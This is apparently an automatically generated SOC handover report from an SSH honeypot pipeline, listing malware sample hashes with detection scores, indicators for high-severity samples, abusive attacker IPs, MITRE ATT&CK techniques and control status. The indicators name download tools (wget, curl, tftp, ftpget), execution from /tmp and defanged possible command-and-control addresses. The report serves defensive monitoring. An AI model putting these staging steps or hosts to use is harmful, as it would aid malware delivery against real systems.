| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 64/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **38/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a6fbbdec757b0fe91ea18dc3d9f7b379c18ca49eeef63afaea8da3c9385b1049` | ELF Binary (Linux executable) (x86-64 64-bit) | `a6fbbdec757b0fe9...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `165.1.75[.]106` | US | Oracle Corporation | **100** ⚠️ | 2 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `178.201.162[.]195` | DE | Vodafone West GmbH | **100** ⚠️ | 29 |
| `159.65.233[.]253` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `165.22.225[.]218` | CA | DigitalOcean, LLC | **100** ⚠️ | 10 |
| `206.81.2[.]201` | US | DigitalOcean, LLC | **100** ⚠️ | 9 |
| `120.48.17[.]184` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 12 |
| `54.38.52[.]18` | PL | OVH Sp. z o. o. | **100** ⚠️ | 50 |
| `45.198.224[.]120` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 4 |
| `45.79.207[.]252` | US | Linode | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 91 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 81 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 22 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 20 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 18 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 425 cases |
| Tool 34  | Credential Extractor        | ✅ 129 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 42 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (2.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 29 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 81 priority case(s) shown individually · 20 recon entry/entries in table (5 group(s) consolidating 320 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-05T21:07:42Z_
